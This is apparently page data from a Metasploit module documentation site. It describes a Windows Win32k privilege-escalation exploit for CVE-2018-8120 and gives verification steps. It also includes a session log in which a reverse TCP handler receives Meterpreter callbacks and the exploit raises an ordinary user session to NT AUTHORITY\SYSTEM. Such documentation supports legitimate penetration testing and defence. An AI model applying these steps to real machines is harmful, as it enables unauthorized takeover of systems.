{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/local/ms18_8120_win32k_privesc","result":{"data":{"moduleMetadataJson":{"id":"cbb6011d-b644-5c0e-b649-ccea90807602","name":"Windows SetImeInfoEx Win32k NULL Pointer Dereference","fullname":"exploit/windows/local/ms18_8120_win32k_privesc","description":"This module exploits elevation of privilege vulnerability that exists in Windows 7 and 2008 R2\n      when the Win32k component fails to properly handle objects in memory. An attacker who\n      successfully exploited this vulnerability could run arbitrary code in kernel mode. An\n      attacker could then install programs; view, change, or delete data; or create new\n      accounts with full user rights.\n\n      This module is tested against windows 7 x86, windows 7 x64 and windows server 2008 R2 standard x64.","rank":400,"fields":{"detailsSlug":"/modules/details/exploit/windows/local/ms18_8120_win32k_privesc","documentationSlug":"/modules/documentation/exploit/windows/local/ms18_8120_win32k_privesc","referencesSlug":"/modules/references/exploit/windows/local/ms18_8120_win32k_privesc"},"documentation":{"html":"<h2 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h2>\n<p>An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.</p>\n<p>To exploit this vulnerability, an attacker would first have to log on to the system. An attacker could then run a specially crafted application that could exploit the vulnerability and take control of an affected system.</p>\n<p>The update addresses this vulnerability by correcting how Win32k handles objects in memory.</p>\n<ul>\n<li><a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120</a></li>\n<li><a href=\"http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html</a></li>\n<li><a href=\"https://github.com/bigric3/cve-2018-8120\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/bigric3/cve-2018-8120</a></li>\n<li><a href=\"https://github.com/unamer/CVE-2018-8120\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/unamer/CVE-2018-8120</a></li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Get a session</li>\n<li><code class=\"language-text\">use exploit/windows/local/ms18_8120_win32k_privesc</code></li>\n<li><code class=\"language-text\">set SESSION [SESSION]</code></li>\n<li><code class=\"language-text\">set LHOST [LHOST]</code></li>\n<li><code class=\"language-text\">exploit</code></li>\n</ol>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(multi/handler) &gt; run\n\n[*] Started reverse TCP handler on 192.168.1.102:4444 \n[*] Sending stage (206403 bytes) to 192.168.1.103\n[*] Meterpreter session 1 opened (192.168.1.102:4444 -&gt; 192.168.1.103:56748) at 2018-10-10 21:55:52 +0530\n\nmeterpreter &gt; getuid \nServer username: zero-PC\\zero\nmeterpreter &gt; background \n[*] Backgrounding session 1...\nmsf exploit(multi/handler) &gt; use exploit/windows/local/ms18_8120_win32k_privesc \nmsf exploit(windows/local/ms18_8120_win32k_privesc) &gt; set SESSION 1\nSESSION =&gt; 1\nmsf exploit(windows/local/ms18_8120_win32k_privesc) &gt; set LHOST 192.168.1.102\nLHOST =&gt; 192.168.1.102\nmsf exploit(windows/local/ms18_8120_win32k_privesc) &gt; run\n\n[*] Started reverse TCP handler on 192.168.1.102:4444 \n[+] Exploiting SetImeInfoEx Win32k NULL Pointer Dereference\n[+] Exploit finished, wait for privileged payload execution to complete.\n[*] Sending stage (206403 bytes) to 192.168.1.103\n[*] Meterpreter session 2 opened (192.168.1.102:4444 -&gt; 192.168.1.103:56749) at 2018-10-10 21:56:35 +0530\n\nmeterpreter &gt; getuid \nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"cbb6011d-b644-5c0e-b649-ccea90807602"}}}